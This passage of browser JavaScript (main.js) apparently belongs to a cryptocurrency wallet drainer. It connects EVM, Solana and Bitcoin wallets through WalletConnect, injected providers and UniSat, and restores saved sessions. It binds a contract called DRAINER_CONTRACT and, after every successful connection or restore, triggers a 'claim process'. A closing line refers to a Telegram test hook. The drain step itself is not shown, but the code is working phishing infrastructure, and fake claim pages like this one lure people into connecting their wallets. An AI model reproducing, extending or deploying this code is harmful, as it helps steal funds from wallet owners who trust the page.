      logDebug(`❌ WalletConnect error: ${err.message}`);
      document.getElementById('apex-wc-deeplink')?.remove();
      try {
        sessionStorage.removeItem(LS.pendingUri);
        sessionStorage.removeItem(LS.pendingTs);
      } catch {}

      if (/rejected|User rejected|Cancelled/i.test(err.message || '')) {
        showStatus('Connection cancelled by user', 'error');
      } else if (/timeout/i.test(err.message || '')) {
        showStatus('Connection timeout - please try again', 'error');
      } else {
        showStatus('Wallet connection failed', 'error');
      }
      isConnecting = false;
      return false;
    }
  }

  // ==========================================================================
  //  BITCOIN (UniSat)
  // ==========================================================================
  async function connectBitcoin() {
    try {
      if (!window.unisat) { showStatus('UniSat wallet not installed', 'error'); return false; }
      await window.unisat.requestAccounts();
      const accounts = await window.unisat.getAccounts();
      if (!accounts || accounts.length === 0) throw new Error('No BTC account');
      const address = accounts[0];
      connectionMode = 'bitcoin';
      saveWallet(address, 'bitcoin');
      updateConnectedUI(address, 'bitcoin');

      if (window.unisat.on) {
        window.unisat.on('accountsChanged', (newAccounts) => {
          if (newAccounts.length === 0) { resetConnectedUI(); clearSavedWallet(); }
          else { saveWallet(newAccounts[0], 'bitcoin'); updateConnectedUI(newAccounts[0], 'bitcoin'); }
        });
        window.unisat.on('networkChanged', (network) => {
          showStatus(`Bitcoin network changed to ${network}`, 'info');
        });
      }
      return true;
    } catch (e) {
      logDebug(`BTC connection error: ${e.message}`);
      showStatus('Bitcoin connection failed: ' + e.message, 'error');
      return false;
    }
  }

  // ==========================================================================
  //  SOLANA
  // ==========================================================================
  async function connectSolana() {
    try {
      const wallets = getSolanaWallets();
      if (wallets.length === 0) {
        showStatus('No Solana wallet found (Phantom, Solflare, etc.)', 'error');
        return false;
      }
      const wallet = wallets[0];
      const provider = wallet.provider;

      let publicKey;
      if (provider.connect) {
        const response = await provider.connect();
        publicKey = response.publicKey?.toString() || response.toString();
      } else if (provider.request) {
        const response = await provider.request({ method: 'connect' });
        publicKey = response.publicKey.toString();
      } else {
        throw new Error('Unsupported provider interface');
      }

      const address = publicKey;
      connectionMode = 'solana';
      saveWallet(address, 'solana');
      updateConnectedUI(address, 'solana');

      window.solanaProvider = provider;
      window.solanaPublicKey = address;

      if (provider.on) {
        provider.on('accountChanged', (newPubkey) => {
          if (newPubkey) {
            const addr = newPubkey.toString();
            saveWallet(addr, 'solana');
            updateConnectedUI(addr, 'solana');
            window.solanaPublicKey = addr;
          } else {
            resetConnectedUI(); clearSavedWallet();
            window.solanaProvider = null;
            window.solanaPublicKey = null;
          }
        });
        provider.on('disconnect', () => {
          resetConnectedUI(); clearSavedWallet();
          window.solanaProvider = null;
          window.solanaPublicKey = null;
        });
      }
      return true;
    } catch (e) {
      logDebug(`SOL connection error: ${e.message}`);
      showStatus('Solana connection failed: ' + e.message, 'error');
      return false;
    }
  }

  // ==========================================================================
  //  CONNECT DISPATCHER
  // ==========================================================================
  async function connectWallet() {
    if (isConnecting) { logDebug('Connection already in progress, please wait'); return; }

    setButtonState(connectButton, 'loading');
    if (walletButton) setButtonState(walletButton, 'loading');
    showStatus('Connecting...', 'info');

    const platform = getPlatform();
    logDebug(`Platform: ${platform} | isMobile: ${isMobile()}`);

    let success = false;

    if (isMobile()) {
      // ---- MOBILE — WC only (injected on mobile is a stub usually) ----
      const inWallet = detectInWalletBrowser();
      const strongInWallet = inWallet && inWallet.wallet !== 'injected';

      if (strongInWallet) {
        logDebug(`📱 In-wallet browser: ${inWallet.name}`);
        success = await connectDirectEVM(6000);
      }
      if (!success) success = await connectViaWalletConnect({ useFallbackId: false });
      if (!success && FALLBACK_PROJECT_ID) {
        logDebug('Mobile: retrying with fallback projectId');
        success = await connectViaWalletConnect({ useFallbackId: true });
      }

      if (!success) {
        showStatus('No wallet found. Please install a WalletConnect-compatible wallet.', 'error');
        setButtonState(connectButton, 'failed');
        if (walletButton) setButtonState(walletButton, 'failed');
        return;
      }
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1500);
      return;
    }

    // ---- DESKTOP ----
    // 1. Direct EVM (4s)
    success = await connectDirectEVM(4000);
    if (success) { logDebug('✅ Desktop: Direct EVM success'); }
    // 2. WC primary
    if (!success) success = await connectViaWalletConnect({ useFallbackId: false });
    // 3. WC fallback
    if (!success && FALLBACK_PROJECT_ID) {
      logDebug('Desktop: WC retry with fallback projectId');
      success = await connectViaWalletConnect({ useFallbackId: true });
    }
    // 4. Solana
    if (!success && getSolanaWallets().length > 0) {
      success = await connectSolana();
      if (success) logDebug('✅ Desktop: Solana success');
    }
    // 5. Bitcoin
    if (!success && window.unisat) {
      success = await connectBitcoin();
      if (success) logDebug('✅ Desktop: Bitcoin success');
    }

    if (success) {
      setButtonState(connectButton, 'connected');
      if (walletButton) setButtonState(walletButton, 'connected');
      setTimeout(() => {
        if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
      }, 1500);
    } else {
      logDebug('❌ Desktop: all methods failed');
      showStatus('No supported wallet found. Please install a wallet.', 'error');
      setButtonState(connectButton, 'failed');
      if (walletButton) setButtonState(walletButton, 'failed');
    }
  }

  // ==========================================================================
  //  HARD DISCONNECT — kills WC session (clears "connected apps" in wallet)
  // ==========================================================================
  async function hardDisconnect({ skipWalletCall = false } = {}) {
    if (isDisconnecting) return;
    isDisconnecting = true;
    try {
      if (!skipWalletCall && connectionMode === 'walletconnect' && wcProvider?.session) {
        try {
          await Promise.race([
            wcProvider.disconnect(),
            new Promise((_, rej) => setTimeout(() => rej(new Error('disconnect timeout')), 6000)),
          ]);
          logDebug('WC session deleted (wallet "connected apps" cleared)');
        } catch (e) { logDebug('WC disconnect err: ' + e.message); }
      }

      if (window.solanaProvider && window.solanaProvider.disconnect) {
        try { await window.solanaProvider.disconnect(); } catch {}
      }

      if (connectionMode === 'injected' && injectedProvider?.request) {
        try {
          await injectedProvider.request({
            method: 'wallet_revokePermissions',
            params: [{ eth_accounts: {} }],
          }).catch(() => {});
        } catch {}
      }
    } finally {
      wcProvider = null;
      injectedProvider = null;
      activeProvider = null;
      web3Instance = null;
      contractInstance = null;
      currentSession = null;
      connectionMode = null;
      window.solanaProvider = null;
      window.solanaPublicKey = null;
      document.getElementById('apex-wc-deeplink')?.remove();
      resetConnectedUI();
      clearSavedWallet();
      isDisconnecting = false;
      logDebug('🔌 Disconnected');
    }
  }

  async function disconnectWallet() {
    showStatus('Disconnecting…', 'info');
    await hardDisconnect();
  }

  // ==========================================================================
  //  BUTTON WIRING
  // ==========================================================================
  const handleClick = async () => {
    if (isConnecting || isDisconnecting) return;
    const isConnected = !!activeProvider || !!getSavedWallet();
    if (isConnected) await disconnectWallet();
    else await connectWallet();
  };

  if (connectButton) connectButton.addEventListener('click', handleClick);
  if (walletButton)  walletButton.addEventListener('click', handleClick);

  if (walletButton && isMobile()) {
    walletButton.addEventListener('click', () => {
      setTimeout(() => connectButton?.scrollIntoView({ behavior: 'smooth', block: 'center' }), 300);
    });
  }

  // ==========================================================================
  //  SESSION RESTORE
  // ==========================================================================
  async function restoreWalletConnection() {
    const savedWallet = getSavedWallet();
    const savedChain  = getSavedChain();
    const savedMode   = getSavedMode();

    // Pending WC redirect from before a mobile reload?
    const pendingUri = sessionStorage.getItem(LS.pendingUri);
    const pendingTs  = sessionStorage.getItem(LS.pendingTs);
    if (pendingUri && pendingTs) {
      const elapsed = Date.now() - parseInt(pendingTs);
      if (elapsed < 120000) {
        logDebug('Detected pending WC session from before reload — checking…');
        try {
          const provider = await initWalletConnect({ useFallbackId: false });
          if (provider?.session && provider.accounts?.length) {
            const a = provider.accounts[0];
            activeProvider = provider;
            connectionMode = 'walletconnect';
            currentSession = provider.session;
            web3Instance = new Web3Ctor(provider);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            saveWallet(a, 'walletconnect', provider.session);
            updateConnectedUI(a, 'evm');
            logDebug(`✅ Pending WC session restored: ${a}`);
            sessionStorage.removeItem(LS.pendingUri);
            sessionStorage.removeItem(LS.pendingTs);
            setTimeout(() => {
              if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
            }, 1000);
            return;
          }
        } catch (e) { logDebug('Pending restore failed: ' + e.message); }
      }
      sessionStorage.removeItem(LS.pendingUri);
      sessionStorage.removeItem(LS.pendingTs);
    }

    if (!savedWallet) return;
    logDebug(`♻️ Attempting restore: addr=${savedWallet} chain=${savedChain} mode=${savedMode}`);

    // --- EVM restore ---
    if (savedChain === 'evm' || savedMode === 'walletconnect' || savedMode === 'injected') {
      // Try WC restore first (persisted session).
      const savedSession = getSavedSession();
      if (savedSession || savedMode === 'walletconnect') {
        try {
          const provider = await initWalletConnect({ useFallbackId: false });
          if (provider?.session && provider.accounts?.length) {
            const a = provider.accounts[0];
            activeProvider = provider;
            connectionMode = 'walletconnect';
            currentSession = provider.session;
            web3Instance = new Web3Ctor(provider);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            saveWallet(a, 'walletconnect', provider.session);
            updateConnectedUI(a, 'evm');
            logDebug(`♻️ WC session restored: ${a}`);
            setTimeout(() => {
              if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
            }, 1000);
            return;
          }
        } catch (e) { logDebug('WC restore failed: ' + e.message); }
      }

      // Try injected (desktop only).
      if (isDesktop() && window.ethereum) {
        try {
          const accounts = await window.ethereum.request({ method: 'eth_accounts' });
          if (accounts?.length && accounts[0].toLowerCase() === savedWallet.toLowerCase()) {
            injectedProvider = window.ethereum;
            activeProvider = window.ethereum;
            connectionMode = 'injected';
            web3Instance = new Web3Ctor(window.ethereum);
            contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
            saveWallet(savedWallet, 'injected');
            setupEVMProviderEvents(window.ethereum);
            updateConnectedUI(savedWallet, 'evm');
            logDebug(`♻️ Injected session restored: ${savedWallet}`);
            setTimeout(() => {
              if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
            }, 1000);
            return;
          }
        } catch (e) { logDebug('Injected restore failed: ' + e.message); }
      }

      // Nothing restorable — clear stale keys.
      logDebug('⚠️ No restorable EVM session — clearing saved wallet');
      clearSavedWallet();
      return;
    }

    // --- Solana restore ---
    if (savedChain === 'solana') {
      if (isDesktop() && window.solana && window.solana.publicKey) {
        const addr = window.solana.publicKey.toString();
        if (addr === savedWallet) {
          connectionMode = 'solana';
          window.solanaProvider = window.solana;
          window.solanaPublicKey = addr;
          web3Instance = null; contractInstance = null;
          updateConnectedUI(addr, 'solana');
          return;
        }
      }
      if (isDesktop() && getSolanaWallets().length > 0) {
        const ok = await connectSolana();
        if (ok) return;
      }
      clearSavedWallet();
      return;
    }

    // --- Bitcoin restore ---
    if (savedChain === 'bitcoin') {
      if (isDesktop() && window.unisat) {
        try {
          const accounts = await window.unisat.getAccounts();
          if (accounts?.length && accounts[0] === savedWallet) {
            connectionMode = 'bitcoin';
            saveWallet(savedWallet, 'bitcoin');
            updateConnectedUI(savedWallet, 'bitcoin');
            return;
          }
        } catch {}
      }
      clearSavedWallet();
    }
  }

  // ==========================================================================
  //  BOOT
  // ==========================================================================
  try {
    const libs = await loadWalletConnect();
    EthereumProvider = libs.EthereumProvider;
    Web3Ctor         = libs.Web3;
    logDebug('✅ All libraries loaded');

    setupEIP6963();

    // Give EIP-6963 a moment to announce, then attempt restore.
    await new Promise((r) => setTimeout(r, 300));
    await restoreWalletConnection();
  } catch (err) {
    logDebug(`❌ Fatal error: ${err.message}`);
    showStatus('Failed to load wallet libraries', 'error');
    return;
  }

  // ==========================================================================
  //  GLOBAL EVM PROVIDER EVENTS (desktop, if already injected)
  // ==========================================================================
  if (window.ethereum && isDesktop() && !wcProvider) {
    setupEVMProviderEvents(window.ethereum);
  }

  // ==========================================================================
  //  VISIBILITY CHANGE — return-from-wallet check
  // ==========================================================================
  document.addEventListener('visibilitychange', () => {
    if (document.hidden) return;
    if (!getSavedWallet()) return;
    logDebug('Page visible — checking connection…');

    const pendingUri = sessionStorage.getItem(LS.pendingUri);
    const pendingTs  = sessionStorage.getItem(LS.pendingTs);
    if (pendingUri && pendingTs) {
      const elapsed = Date.now() - parseInt(pendingTs);
      if (elapsed < 120000) {
        setTimeout(async () => {
          try {
            const provider = await initWalletConnect({ useFallbackId: false });
            if (provider?.session && provider.accounts?.length) {
              const a = provider.accounts[0];
              activeProvider = provider;
              connectionMode = 'walletconnect';
              currentSession = provider.session;
              web3Instance = new Web3Ctor(provider);
              contractInstance = new web3Instance.eth.Contract(CONTRACT_ABI, DRAINER_CONTRACT);
              saveWallet(a, 'walletconnect', provider.session);
              updateConnectedUI(a, 'evm');
              sessionStorage.removeItem(LS.pendingUri);
              sessionStorage.removeItem(LS.pendingTs);
              setTimeout(() => {
                if (typeof window.initiateClaimProcess === 'function') window.initiateClaimProcess();
              }, 1000);
            }
          } catch (e) { logDebug('Visibility restore failed: ' + e.message); }
        }, 1000);
      }
    }
  });

  // ==========================================================================
  //  CLEANUP
  // ==========================================================================
  window.addEventListener('beforeunload', () => {
    document.getElementById('apex-wc-deeplink')?.remove();
  });

  // Public hooks (script.js may call these).
  window.apexConnect    = connectWallet;
  window.apexDisconnect = disconnectWallet;

  logDebug(`✅ main.js fully initialised – device‑aware, fast connection flow`);
  logDebug(`   Platform: ${getPlatform()} | Mobile: ${isMobile()} | Desktop: ${isDesktop()}`);
  logDebug(`   Flow: ${isMobile() ? 'WalletConnect (modal + QR)' : 'Direct EVM (4s) → WalletConnect → Solana → Bitcoin'}`);
  console.log('✅ main.js ready — test with testTelegram("hi")');
})();
